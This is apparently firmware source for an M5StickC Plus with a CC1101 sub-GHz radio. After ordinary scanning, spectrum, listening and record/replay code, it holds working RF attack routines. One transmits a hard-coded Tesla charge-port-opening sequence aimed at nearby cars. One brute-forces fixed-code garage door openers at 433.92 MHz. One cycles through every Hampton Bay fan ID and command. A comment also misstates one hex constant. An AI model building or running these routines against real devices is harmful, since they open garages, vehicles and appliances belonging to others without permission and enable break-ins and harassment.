#include "subghz_operations.h"
#include <M5StickCPlus.h>

SubGhzOperations::SubGhzOperations(CC1101Interface* radio, MenuSystem* menu) {
    cc1101 = radio;
    menuSystem = menu;
    lastMode = MODE_IDLE;
    lastRSSI = -100;
    lastDisplayedRSSI = -999;  // Force first draw
    scanCounter = 0;
    lastScanUpdate = 0;
    lastSpectrumUpdate = 0;
    lastListenUpdate = 0;
    signalCount = 0;
    forceListenDraw = true;
    lastListenFreq = 0.0;
    recordedSampleCount = 0;
    hasRecording = false;
    isTransmitting = false;
    recordStartTime = 0;
}

void SubGhzOperations::begin() {
    // Initialize spectrum data
    for (int i = 0; i < SPECTRUM_POINTS; i++) {
        spectrumData[i] = -100;
    }
    
    // Initialize RSSI history
    for (int i = 0; i < 120; i++) {
        rssiHistory[i] = -100;
    }
    historyIndex = 0;
}

void SubGhzOperations::update() {
    OperationMode mode = menuSystem->getMode();
    
    // Reset display state when mode changes
    if (mode != lastMode) {
        if (mode == MODE_SCANNING) {
            lastDisplayedRSSI = -999;  // Force redraw
            scanCounter = 0;
            historyIndex = 0;
            for (int i = 0; i < 120; i++) {
                rssiHistory[i] = -100;
            }
        } else if (mode == MODE_LISTENING) {
            signalCount = 0;  // Reset signal counter
            forceListenDraw = true;  // Force initial draw
            lastListenUpdate = 0;  // Force immediate update
            lastListenFreq = 0.0;  // Reset frequency to force detection
        } else if (mode == MODE_SPECTRUM) {
            // Reset spectrum state
            for (int i = 0; i < SPECTRUM_POINTS; i++) {
                spectrumData[i] = -100;
            }
        }
        lastMode = mode;
    }
    
    switch (mode) {
        case MODE_SCANNING:
            updateScan();
            break;
        case MODE_SPECTRUM:
            updateSpectrum();
            break;
        case MODE_LISTENING:
            updateListen();
            break;
        case MODE_RECORDING:
            updateRecord();
            break;
        case MODE_REPLAYING:
            updateReplay();
            break;
        default:
            break;
    }
}

void SubGhzOperations::updateScan() {
    if (millis() - lastScanUpdate > 100) {
        // Set frequency and get real RSSI
        cc1101->setFrequency(menuSystem->getSelectedFrequency());
        cc1101->setRxMode();
        int rssi = cc1101->getRSSI();
        lastRSSI = rssi;
        
        // Add to history buffer
        rssiHistory[historyIndex] = rssi;
        historyIndex = (historyIndex + 1) % 120;
        
        // Update RSSI display only if value changed significantly (±2 dBm)
        // Draw below frequency text (y=32) and above waveform (y=52)
        if (abs(rssi - lastDisplayedRSSI) >= 2) {
            M5.Lcd.fillRect(10, 42, 220, 8, BLACK);  // Clear the text area
            M5.Lcd.setCursor(10, 42);
            M5.Lcd.setTextSize(1);
            M5.Lcd.setTextColor(GREEN, BLACK);
            M5.Lcd.printf("RSSI: %d dBm", rssi);
            lastDisplayedRSSI = rssi;
        }
        
        // Draw only the newest waveform segment (incremental drawing)
        drawRSSIWaveform();
        
        lastScanUpdate = millis();
    }
}

void SubGhzOperations::updateSpectrum() {
    if (millis() - lastSpectrumUpdate > 500) {
        float baseFreq = menuSystem->getSelectedFrequency();
        float startFreq = baseFreq - 5.0;
        float endFreq = baseFreq + 5.0;
        float step = 10.0 / SPECTRUM_POINTS;
        
        // Scan spectrum with real CC1101
        cc1101->scanSpectrum(startFreq, endFreq, step, spectrumData, SPECTRUM_POINTS);
        
        // Draw spectrum
        drawSpectrum();
        
        lastSpectrumUpdate = millis();
    }
}

void SubGhzOperations::drawSpectrum() {
    // Clear spectrum graph area only (below text labels, above controls)
    // Text ends at line 45 (+ ~8 pixels = 53), controls start at 120
    M5.Lcd.fillRect(0, 56, 240, 60, BLACK);
    
    // Draw spectrum bars
    int barWidth = 240 / SPECTRUM_POINTS;
    if (barWidth < 1) barWidth = 1;
    
    for (int i = 0; i < SPECTRUM_POINTS; i++) {
        int barHeight = map(spectrumData[i], -100, -30, 0, 56);
        if (barHeight < 0) barHeight = 0;
        if (barHeight > 56) barHeight = 56;
        
        uint16_t color = GREEN;
        if (spectrumData[i] > -50) color = RED;
        else if (spectrumData[i] > -70) color = YELLOW;
        
        M5.Lcd.fillRect(i * barWidth, 116 - barHeight, barWidth - 1, barHeight, color);
    }
}

void SubGhzOperations::updateListen() {
    if (millis() - lastListenUpdate > 50) {
        static int lastDisplayedListenRSSI = -200;  // Force first draw
        static int lastSignalCount = -1;  // Force first draw
        static bool lastSignalState = false;  // Track signal transitions
        
        // Reset static variables when forceListenDraw is set (mode entry or freq change)
        if (forceListenDraw) {
            lastDisplayedListenRSSI = -200;
            lastSignalCount = -1;
            lastSignalState = false;
        }
        
        // Check if frequency changed
        float currentFreq = menuSystem->getSelectedFrequency();
        if (currentFreq != lastListenFreq) {
            forceListenDraw = true;
            lastListenFreq = currentFreq;
            lastDisplayedListenRSSI = -200;  // Force RSSI redraw
        }
        
        // Set frequency and RX mode
        cc1101->setFrequency(currentFreq);
        cc1101->setRxMode();
        delay(10);  // Allow CC1101 to stabilize
        int rssi = cc1101->getRSSI();
        
        // Update RSSI display if changed by ±2 dBm or forced draw
        if (forceListenDraw || abs(rssi - lastDisplayedListenRSSI) >= 2) {
            M5.Lcd.fillRect(10, 55, 220, 10, BLACK);
            M5.Lcd.setCursor(10, 55);
            M5.Lcd.setTextSize(1);
            M5.Lcd.setTextColor(WHITE, BLACK);
            M5.Lcd.printf("RSSI: %d dBm", rssi);
            lastDisplayedListenRSSI = rssi;
            
            displaySignalStrength(rssi);
            
            // If forced draw, also show signal counter
            if (forceListenDraw) {
                M5.Lcd.fillRect(10, 68, 220, 10, BLACK);
                M5.Lcd.setCursor(10, 68);
                M5.Lcd.setTextColor(GREEN, BLACK);
                M5.Lcd.printf("Signals: %d", signalCount);
                lastSignalCount = signalCount;
            }
            
            forceListenDraw = false;
        }
        
        // Check for real signal detection - only count on transition (not continuously)
        bool currentSignalState = cc1101->signalDetected();
        if (currentSignalState && !lastSignalState) {
            // Signal just appeared (rising edge)
            signalCount++;
            if (signalCount != lastSignalCount) {
                M5.Lcd.fillRect(10, 68, 220, 10, BLACK);
                M5.Lcd.setCursor(10, 68);
                M5.Lcd.setTextColor(GREEN, BLACK);
                M5.Lcd.printf("Signals: %d", signalCount);
                lastSignalCount = signalCount;
            }
            
            // Try to receive data
            int len = cc1101->receiveData(rxBuffer, sizeof(rxBuffer));
            if (len > 0) {
                M5.Lcd.fillRect(10, 81, 220, 10, BLACK);
                M5.Lcd.setCursor(10, 81);
                M5.Lcd.printf("RX: %d bytes", len);
            }
        }
        lastSignalState = currentSignalState;
        
        lastListenUpdate = millis();
    }
}

void SubGhzOperations::updateRecord() {
    if (!hasRecording) {
        // Set frequency and RX mode
        cc1101->setFrequency(menuSystem->getSelectedFrequency());
        cc1101->setRxMode();
        
        // Check if signal detected
        if (cc1101->signalDetected()) {
            M5.Lcd.fillRect(10, 80, 220, 20, BLACK);
            M5.Lcd.setCursor(10, 80);
            M5.Lcd.setTextColor(YELLOW, BLACK);
            M5.Lcd.println("Recording...");
            
            // Record signal
            if (cc1101->recordSignal(recordedTimings, MAX_RECORDING_SAMPLES)) {
                recordedSampleCount = 0;
                for (int i = 0; i < MAX_RECORDING_SAMPLES; i++) {
                    if (recordedTimings[i] > 0) {
                        recordedSampleCount++;
                    } else {
                        break;
                    }
                }
                
                hasRecording = true;
                
                M5.Lcd.fillRect(10, 80, 220, 30, BLACK);
                M5.Lcd.setCursor(10, 80);
                M5.Lcd.setTextColor(GREEN, BLACK);
                M5.Lcd.printf("Recorded!");
                M5.Lcd.setCursor(10, 95);
                M5.Lcd.printf("%d samples", recordedSampleCount);
                
                delay(1000);
                menuSystem->setMode(MODE_REPLAYING);
            }
        }
        
        // Show timeout
        if (recordStartTime == 0) {
            recordStartTime = millis();
        }
        
        unsigned long elapsed = (millis() - recordStartTime) / 1000;
        M5.Lcd.fillRect(10, 80, 220, 15, BLACK);
        M5.Lcd.setCursor(10, 80);
        M5.Lcd.setTextColor(WHITE, BLACK);
        M5.Lcd.printf("Timeout: %d/30s", elapsed);
        
        if (elapsed >= 30) {
            recordStartTime = 0;
            menuSystem->setMode(MODE_IDLE);
        }
    }
}

void SubGhzOperations::updateReplay() {
    if (!isTransmitting) {
        M5.Lcd.fillRect(10, 60, 220, 40, BLACK);
        M5.Lcd.setCursor(10, 60);
        M5.Lcd.setTextSize(1);
        M5.Lcd.setTextColor(WHITE, BLACK);
        
        if (hasRecording) {
            M5.Lcd.printf("Ready to replay");
            M5.Lcd.setCursor(10, 75);
            M5.Lcd.printf("%d samples", recordedSampleCount);
            
            // Check if button A pressed to transmit
            if (M5.BtnA.wasPressed()) {
                isTransmitting = true;
                
                M5.Lcd.fillRect(10, 60, 220, 40, BLACK);
                M5.Lcd.setCursor(10, 60);
                M5.Lcd.setTextColor(RED, BLACK);
                M5.Lcd.println("TRANSMITTING!");
                
                // Set frequency and replay signal
                cc1101->setFrequency(menuSystem->getSelectedFrequency());
                cc1101->replaySignal(recordedTimings, recordedSampleCount);
                
                delay(500);
                
                M5.Lcd.fillRect(10, 60, 220, 40, BLACK);
                M5.Lcd.setCursor(10, 60);
                M5.Lcd.setTextColor(GREEN, BLACK);
                M5.Lcd.println("Transmitted!");
                
                isTransmitting = false;
            }
        } else {
            M5.Lcd.setTextColor(RED, BLACK);
            M5.Lcd.println("No recording!");
            M5.Lcd.setCursor(10, 75);
            M5.Lcd.setTextColor(YELLOW, BLACK);
            M5.Lcd.println("Record signal first");
        }
    }
}

void SubGhzOperations::drawRSSIWaveform() {
    // Scrolling chart approach - draw complete history every time
    // but only update every few samples to balance smoothness and performance
    static int lastDrawIndex = -1;
    
    // Update every 2 samples (200ms) for smooth but not too flashy
    if (historyIndex % 2 != 0) return;
    if (lastDrawIndex == historyIndex) return;
    lastDrawIndex = historyIndex;
    
    // Chart area: below freq text (ends ~y=48), above controls (start y=110)
    int chartTop = 52;
    int chartBottom = 108;
    int chartHeight = chartBottom - chartTop;
    
    // Clear the waveform area
    M5.Lcd.fillRect(5, chartTop, 230, chartHeight, BLACK);
    
    // Draw grid lines for reference
    M5.Lcd.drawFastHLine(5, chartTop + chartHeight/2, 230, DARKGREY);  // Center line
    
    // Draw the complete waveform history
    // Most recent data on the RIGHT, scrolling left (like a chart recorder)
    for (int x = 0; x < 230; x += 2) {
        // Map screen position to history buffer (right side = most recent)
        int sampleIdx = x / 2;
        if (sampleIdx >= 115) continue;
        
        // Reverse: rightmost pixel = newest data
        int idx = (historyIndex - (114 - sampleIdx) + 120) % 120;
        int y = map(rssiHistory[idx], -100, -30, chartBottom, chartTop);
        y = constrain(y, chartTop, chartBottom);
        
        // Color coding
        uint16_t color = GREEN;
        if (rssiHistory[idx] > -50) color = RED;
        else if (rssiHistory[idx] > -70) color = YELLOW;
        
        // Draw vertical line for this sample
        M5.Lcd.drawPixel(5 + x, y, color);
        
        // Connect to previous sample for continuity
        if (x > 0 && sampleIdx < 115) {
            int prevIdx = (historyIndex - (114 - (sampleIdx - 1)) + 120) % 120;
            int prevY = map(rssiHistory[prevIdx], -100, -30, chartBottom, chartTop);
            prevY = constrain(prevY, chartTop, chartBottom);
            M5.Lcd.drawLine(5 + x - 2, prevY, 5 + x, y, color);
        }
    }
}

void SubGhzOperations::displaySignalStrength(int rssi) {
    // Draw signal strength bars below text, above controls (controls at y=110)
    int barCount = mapRSSIToBar(rssi);
    int barX = 10;
    int barY = 93;
    int barWidth = 10;
    int barSpacing = 3;
    
    M5.Lcd.fillRect(barX, barY, 240 - 20, 15, BLACK);
    
    for (int i = 0; i < 10; i++) {
        uint16_t color = (i < barCount) ? GREEN : DARKGREY;
        if (i >= 7 && i < barCount) color = YELLOW;
        if (i >= 9 && i < barCount) color = RED;
        
        M5.Lcd.fillRect(barX + (i * (barWidth + barSpacing)), barY, barWidth, 15, color);
    }
}

int SubGhzOperations::mapRSSIToBar(int rssi) {
    if (rssi < -100) return 0;
    if (rssi > -30) return 10;
    return map(rssi, -100, -30, 0, 10);
}

void SubGhzOperations::runTeslaChargePortHack() {
    // Tesla charge port opener for USA - 315MHz ASK/OOK modulation
    // Signal pattern from TeslaTaunter and security research community
    
    M5.Lcd.fillScreen(BLACK);
    M5.Lcd.setTextSize(2);
    M5.Lcd.setCursor(10, 10);
    M5.Lcd.setTextColor(RED, BLACK);
    M5.Lcd.println("TESLA HACK");
    
    M5.Lcd.setTextSize(1);
    M5.Lcd.setCursor(10, 40);
    M5.Lcd.setTextColor(WHITE, BLACK);
    M5.Lcd.println("Transmitting at 315MHz...");
    
    // Tesla signal sequence (from TeslaTaunter project)
    const uint8_t sequence[] = { 
        0x02,0xAA,0xAA,0xAA,                              // Preamble (26 bits alternating 1010)
        0x2B,                                             // Sync byte
        0x2C,0xCB,0x33,0x33,0x2D,0x34,0xB5,0x2B,0x4D,0x32,0xAD,0x2C,0x56,0x59,0x96,0x66,
        0x66,0x5A,0x69,0x6A,0x56,0x9A,0x65,0x5A,0x58,0xAC,0xB3,0x2C,0xCC,0xCC,0xB4,0xD2,
        0xD4,0xAD,0x34,0xCA,0xB4,0xA0
    };
    const uint8_t messageLength = sizeof(sequence);
    const uint16_t pulseWidth = 400;        // Microseconds per bit
    const uint16_t messageDistance = 23;    // Milliseconds between transmissions
    const uint8_t transmissions = 5;        // Repeat 5 times
    
    // Configure CC1101 for 315MHz ASK/OOK transmission
    cc1101->setFrequency(315.00);
    cc1101->setModulation(2);  // ASK/OOK modulation
    
    // Configure GDO0 pin for output
    pinMode(cc1101->getGDO0Pin(), OUTPUT);
    digitalWrite(cc1101->getGDO0Pin(), LOW);
    
    M5.Lcd.setCursor(10, 60);
    M5.Lcd.setTextColor(YELLOW, BLACK);
    M5.Lcd.println("Sending signal...");
    
    // Start TX mode
    cc1101->setTxMode();
    
    // Send the sequence multiple times
    for (uint8_t t = 0; t < transmissions; t++) {
        M5.Lcd.fillRect(10, 60, 220, 10, BLACK);
        M5.Lcd.setCursor(10, 60);
        M5.Lcd.setTextColor(YELLOW, BLACK);
        M5.Lcd.printf("Transmission %d/%d...", t + 1, transmissions);
        
        // Send each byte in the sequence
        for (uint8_t i = 0; i < messageLength; i++) {
            uint8_t dataByte = sequence[i];
            // Send each bit, MSB first
            for (int8_t bit = 7; bit >= 0; bit--) {
                digitalWrite(cc1101->getGDO0Pin(), (dataByte & (1 << bit)) ? HIGH : LOW);
                delayMicroseconds(pulseWidth);
            }
        }
        
        delay(messageDistance);  // Pause between transmissions
    }
    
    // Stop TX mode and restore GDO0
    cc1101->setIdleMode();
    pinMode(cc1101->getGDO0Pin(), INPUT);
    
    M5.Lcd.fillRect(10, 60, 220, 10, BLACK);
    M5.Lcd.setCursor(10, 60);
    M5.Lcd.setTextColor(GREEN, BLACK);
    M5.Lcd.println("Transmission complete!");
    
    M5.Lcd.setCursor(10, 80);
    M5.Lcd.setTextColor(WHITE, BLACK);
    M5.Lcd.println("Check nearby Teslas");
    
    M5.Lcd.setCursor(10, 120);
    M5.Lcd.setTextColor(YELLOW, BLACK);
    M5.Lcd.println("A: Again  B: Back");
    
    // Return to idle
    cc1101->setIdleMode();
    
    // Wait for button press
    while (true) {
        M5.update();
        if (M5.BtnA.wasPressed()) {
            // Run again
            runTeslaChargePortHack();
            return;
        }
        if (M5.BtnB.wasPressed()) {
            // Go back to hacks menu
            return;
        }
        delay(20);
    }
}

void SubGhzOperations::runGarageDoorBruteForce() {
    // Garage door brute force for common fixed-code systems
    // Targets 8-12 bit DIP switch codes at 433.92MHz (most common)
    
    M5.Lcd.fillScreen(BLACK);
    M5.Lcd.setTextSize(2);
    M5.Lcd.setCursor(10, 10);
    M5.Lcd.setTextColor(RED, BLACK);
    M5.Lcd.println("GARAGE BF");
    
    M5.Lcd.setTextSize(1);
    M5.Lcd.setCursor(10, 35);
    M5.Lcd.setTextColor(WHITE, BLACK);
    M5.Lcd.println("Fixed-code brute force");
    M5.Lcd.setCursor(10, 45);
    M5.Lcd.println("Freq: 433.92 MHz");
    
    M5.Lcd.setCursor(10, 65);
    M5.Lcd.setTextColor(YELLOW, BLACK);
    M5.Lcd.println("A: 8-bit  B: Back");
    M5.Lcd.setCursor(10, 75);
    M5.Lcd.println("PWR: 12-bit");
    
    // Wait for user selection
    while (true) {
        M5.update();
        
        if (M5.BtnA.wasPressed()) {
            // 8-bit brute force (256 codes)
            bruteForceGarageCodes(8);
            return;
        }
        
        if (M5.BtnB.wasPressed()) {
            // Go back
            return;
        }
        
        if (M5.Axp.GetBtnPress()) {
            // 12-bit brute force (4096 codes)
            bruteForceGarageCodes(12);
            return;
        }
        
        delay(20);
    }
}

void SubGhzOperations::bruteForceGarageCodes(int bits) {
    M5.Lcd.fillScreen(BLACK);
    M5.Lcd.setTextSize(2);
    M5.Lcd.setCursor(10, 10);
    M5.Lcd.setTextColor(ORANGE, BLACK);
    M5.Lcd.printf("%d-BIT BF", bits);
    
    M5.Lcd.setTextSize(1);
    M5.Lcd.setCursor(10, 35);
    M5.Lcd.setTextColor(WHITE, BLACK);
    M5.Lcd.println("Transmitting codes...");
    
    // Configure CC1101 for 433.92MHz OOK
    cc1101->setFrequency(433.92);
    cc1101->setModulation(2);  // ASK/OOK
    
    pinMode(cc1101->getGDO0Pin(), OUTPUT);
    digitalWrite(cc1101->getGDO0Pin(), LOW);
    
    int maxCodes = (1 << bits);  // 2^bits
    int codesSent = 0;
    bool stopped = false;
    
    M5.Lcd.setCursor(10, 55);
    M5.Lcd.setTextColor(YELLOW, BLACK);
    M5.Lcd.printf("Total: %d codes", maxCodes);
    
    M5.Lcd.setCursor(10, 120);
    M5.Lcd.setTextColor(RED, BLACK);
    M5.Lcd.println("B: Stop");
    
    cc1101->setTxMode();
    
    for (int code = 0; code < maxCodes && !stopped; code++) {
        // Send preamble and sync
        sendGarageSync();
        
        // Send the code bits (MSB first)
        for (int bit = bits - 1; bit >= 0; bit--) {
            if (code & (1 << bit)) {
                sendGarageBit(1);  // HIGH bit
            } else {
                sendGarageBit(0);  // LOW bit
            }
        }
        
        // End pulse
        digitalWrite(cc1101->getGDO0Pin(), LOW);
        delayMicroseconds(500);
        
        codesSent++;
        
        // Update display every 10 codes
        if (codesSent % 10 == 0) {
            M5.Lcd.fillRect(10, 70, 220, 40, BLACK);
            M5.Lcd.setCursor(10, 70);
            M5.Lcd.setTextColor(GREEN, BLACK);
            M5.Lcd.printf("Sent: %d / %d", codesSent, maxCodes);
            M5.Lcd.setCursor(10, 85);
            M5.Lcd.printf("Code: 0x%X", code);
            M5.Lcd.setCursor(10, 100);
            int percent = (codesSent * 100) / maxCodes;
            M5.Lcd.printf("Progress: %d%%", percent);
            
            // Check for stop button
            M5.update();
            if (M5.BtnB.wasPressed()) {
                stopped = true;
            }
        }
        
        // Small delay between codes (some receivers need this)
        delayMicroseconds(2000);
    }
    
    cc1101->setIdleMode();
    pinMode(cc1101->getGDO0Pin(), INPUT);
    
    M5.Lcd.fillRect(10, 50, 220, 70, BLACK);
    M5.Lcd.setCursor(10, 60);
    
    if (stopped) {
        M5.Lcd.setTextColor(RED, BLACK);
        M5.Lcd.println("STOPPED BY USER");
        M5.Lcd.setCursor(10, 75);
        M5.Lcd.setTextColor(WHITE, BLACK);
        M5.Lcd.printf("Sent %d codes", codesSent);
    } else {
        M5.Lcd.setTextColor(GREEN, BLACK);
        M5.Lcd.println("COMPLETE!");
        M5.Lcd.setCursor(10, 75);
        M5.Lcd.setTextColor(WHITE, BLACK);
        M5.Lcd.printf("All %d codes sent", maxCodes);
    }
    
    M5.Lcd.setCursor(10, 120);
    M5.Lcd.setTextColor(YELLOW, BLACK);
    M5.Lcd.println("B: Back");
    
    while (true) {
        M5.update();
        if (M5.BtnB.wasPressed()) {
            return;
        }
        delay(20);
    }
}

void SubGhzOperations::sendGarageSync() {
    // Standard sync pattern for many garage door openers
    // Long HIGH pulse followed by short LOW
    digitalWrite(cc1101->getGDO0Pin(), HIGH);
    delayMicroseconds(9000);  // Sync high
    digitalWrite(cc1101->getGDO0Pin(), LOW);
    delayMicroseconds(4500);  // Sync low
}

void SubGhzOperations::sendGarageBit(int bit) {
    // PWM encoding: bit 1 = long high, short low | bit 0 = short high, long low
    if (bit) {
        // Bit 1: 1500us HIGH, 500us LOW
        digitalWrite(cc1101->getGDO0Pin(), HIGH);
        delayMicroseconds(1500);
        digitalWrite(cc1101->getGDO0Pin(), LOW);
        delayMicroseconds(500);
    } else {
        // Bit 0: 500us HIGH, 1500us LOW
        digitalWrite(cc1101->getGDO0Pin(), HIGH);
        delayMicroseconds(500);
        digitalWrite(cc1101->getGDO0Pin(), LOW);
        delayMicroseconds(1500);
    }
}

// Hampton Bay Fan Brute Force (303 MHz)
void SubGhzOperations::runHamptonBayFanBruteForce() {
    M5.Lcd.fillScreen(BLACK);
    M5.Lcd.setTextSize(2);
    M5.Lcd.setCursor(5, 10);
    M5.Lcd.setTextColor(RED);
    M5.Lcd.println("Hampton Bay");
    
    M5.Lcd.setCursor(5, 35);
    M5.Lcd.setTextColor(WHITE);
    M5.Lcd.setTextSize(1);
    M5.Lcd.println("Brute force all DIP IDs");
    M5.Lcd.println("(0000-1111)");
    
    M5.Lcd.setCursor(5, 65);
    M5.Lcd.println("Commands per ID:");
    M5.Lcd.setCursor(5, 80);
    M5.Lcd.println(" - Fan On/Off");
    M5.Lcd.setCursor(5, 95);
    M5.Lcd.println(" - Light On/Off");
    
    M5.Lcd.setCursor(5, 120);
    M5.Lcd.setTextColor(YELLOW);
    M5.Lcd.println("A: Start  B: Cancel");
    
    while (true) {
        M5.update();
        if (M5.BtnA.wasPressed()) {
            bruteForceHamptonBay();
            break;
        }
        if (M5.BtnB.wasPressed()) {
            break;
        }
        delay(10);
    }
}

void SubGhzOperations::bruteForceHamptonBay() {
    // Hampton Bay protocol:
    // Frequency: ~303 MHz (try 303.00, 303.631, 303.875)
    // 24-bit command: base (12 bits) + fan ID inverted (4 bits) + cmd type (4 bits) + command (4 bits)
    // Base: 111111000110 (0xFC6)
    // Fan ID: 0-15 (4-bit DIP switch, inverted in transmission)
    // Cmd Type: 0111 (normal commands)
    // Commands:
    //   0b0111 (7)  - Fan OFF
    //   0b1110 (14) - Fan ON (from off)
    //   0b0001 (1)  - Light OFF
    //   0b0010 (2)  - Light ON
    
    float testFreqs[] = {303.00, 303.631, 303.875};
    int numFreqs = 3;
    
    // Configure CC1101 for 303 MHz ASK transmission
    cc1101->setFrequency(testFreqs[0]);
    cc1101->setModulation(2);  // ASK/OOK
    cc1101->setIdleMode();
    
    pinMode(cc1101->getGDO0Pin(), OUTPUT);
    digitalWrite(cc1101->getGDO0Pin(), LOW);
    
    M5.Lcd.fillScreen(BLACK);
    M5.Lcd.setTextSize(1);
    M5.Lcd.setCursor(5, 5);
    M5.Lcd.setTextColor(YELLOW, BLACK);
    M5.Lcd.println("Hampton Bay Brute Force");
    
    M5.Lcd.setCursor(5, 120);
    M5.Lcd.setTextColor(RED, BLACK);
    M5.Lcd.println("B: Stop");
    
    int totalCmds = 16 * 4 * numFreqs;  // 16 IDs x 4 commands x 3 frequencies
    int cmdCount = 0;
    
    // Try each frequency
    for (int freqIdx = 0; freqIdx < numFreqs; freqIdx++) {
        cc1101->setFrequency(testFreqs[freqIdx]);
        
        // Clear and redraw frequency line
        M5.Lcd.fillRect(0, 25, 240, 10, BLACK);
        M5.Lcd.setCursor(5, 25);
        M5.Lcd.setTextColor(GREEN, BLACK);
        M5.Lcd.printf("Freq: %.3f MHz", testFreqs[freqIdx]);
        
        // Try all 16 DIP switch IDs (0000 to 1111)
        for (int fanId = 0; fanId < 16; fanId++) {
            M5.update();
            if (M5.BtnB.wasPressed()) {
                M5.Lcd.fillRect(0, 110, 240, 10, BLACK);
                M5.Lcd.setCursor(5, 110);
                M5.Lcd.setTextColor(RED, BLACK);
                M5.Lcd.println("STOPPED");
                delay(1000);
                return;
            }
            
            // Clear and display current ID
            M5.Lcd.fillRect(0, 45, 240, 10, BLACK);
            M5.Lcd.setCursor(5, 45);
            M5.Lcd.setTextColor(CYAN, BLACK);
            M5.Lcd.printf("DIP ID: %d (", fanId);
            for (int b = 3; b >= 0; b--) {
                M5.Lcd.print((fanId >> b) & 1);
            }
            M5.Lcd.print(")");
            
            // Send 4 commands for this ID: Fan On, Fan Off, Light On, Light Off
            int commands[] = {0b1110, 0b0111, 0b0010, 0b0001};  // On, Off, LightOn, LightOff
            const char* cmdNames[] = {"Fan ON  ", "Fan OFF ", "Light ON", "LightOFF"};
            
            for (int cmdIdx = 0; cmdIdx < 4; cmdIdx++) {
                // Check for stop button
                M5.update();
                if (M5.BtnB.wasPressed()) {
                    M5.Lcd.fillRect(0, 110, 240, 10, BLACK);
                    M5.Lcd.setCursor(5, 110);
                    M5.Lcd.setTextColor(RED, BLACK);
                    M5.Lcd.println("STOPPED");
                    delay(1000);
                    return;
                }
                
                cmdCount++;
                
                // Clear and update command line
                M5.Lcd.fillRect(0, 65, 240, 10, BLACK);
                M5.Lcd.setCursor(5, 65);
                M5.Lcd.setTextColor(WHITE, BLACK);
                M5.Lcd.printf("Cmd: %s", cmdNames[cmdIdx]);
                
                // Clear and update progress
                M5.Lcd.fillRect(0, 85, 240, 10, BLACK);
                M5.Lcd.setCursor(5, 85);
                M5.Lcd.setTextColor(YELLOW, BLACK);
                M5.Lcd.printf("Progress: %d/%d", cmdCount, totalCmds);
                
                // Clear and update percentage
                M5.Lcd.fillRect(0, 100, 240, 10, BLACK);
                M5.Lcd.setCursor(5, 100);
                M5.Lcd.printf("%.1f%%", (cmdCount * 100.0) / totalCmds);
                
                // Send the command
                sendHamptonBayCommand(fanId, commands[cmdIdx]);
                
                delay(50);  // Brief delay between commands
            }
            
            delay(100);  // Delay between IDs
        }
    }
    
    M5.Lcd.setCursor(5, 120);
    M5.Lcd.setTextColor(GREEN);
    M5.Lcd.println("COMPLETE! B: Back");
    
    while (true) {
        M5.update();
        if (M5.BtnB.wasPressed()) {
            break;
        }
        delay(10);
    }
}

void SubGhzOperations::sendHamptonBayCommand(int fanId, int command) {
    // Hampton Bay 24-bit command structure:
    // Bits 23-12: 111111000110 (0xFC6) - base/preamble
    // Bits 11-8:  Fan ID (inverted) - 4 bits
    // Bits 7-4:   0111 - command type (normal commands)
    // Bits 3-0:   command - 4 bits
    
    uint32_t baseCommand = 0b111111000110000000000000;  // 0xFC60000
    uint32_t fanIdInverted = (fanId ^ 0b1111) << 8;     // Invert and shift to bits 11-8
    uint32_t cmdType = 0b01110000;                       // Normal command type at bits 7-4
    uint32_t finalCommand = baseCommand | fanIdInverted | cmdType | command;
    
    // Protocol 11 parameters (from rc-switch library):
    // Pulse length: 320 microseconds
    // Sync: High: 1, Low: 31
    // Zero: High: 1, Low: 3
    // One:  High: 3, Low: 1
    // Inverted: false
    
    int pulseLength = 320;
    int repeats = 8;  // Send 8 times like the original code
    
    for (int repeat = 0; repeat < repeats; repeat++) {
        // Sync pulse
        digitalWrite(cc1101->getGDO0Pin(), HIGH);
        delayMicroseconds(pulseLength * 1);
        digitalWrite(cc1101->getGDO0Pin(), LOW);
        delayMicroseconds(pulseLength * 31);
        
        // Send 24 bits MSB first
        for (int i = 23; i >= 0; i--) {
            int bit = (finalCommand >> i) & 1;
            
            if (bit) {
                // One: 3 high, 1 low
                digitalWrite(cc1101->getGDO0Pin(), HIGH);
                delayMicroseconds(pulseLength * 3);
                digitalWrite(cc1101->getGDO0Pin(), LOW);
                delayMicroseconds(pulseLength * 1);
            } else {
                // Zero: 1 high, 3 low
                digitalWrite(cc1101->getGDO0Pin(), HIGH);
                delayMicroseconds(pulseLength * 1);
                digitalWrite(cc1101->getGDO0Pin(), LOW);
                delayMicroseconds(pulseLength * 3);
            }
        }
        
        // End pulse (ensure line is low)
        digitalWrite(cc1101->getGDO0Pin(), LOW);
        
        // Inter-repeat delay
        if (repeat < repeats - 1) {
            delay(10);
        }
    }
}
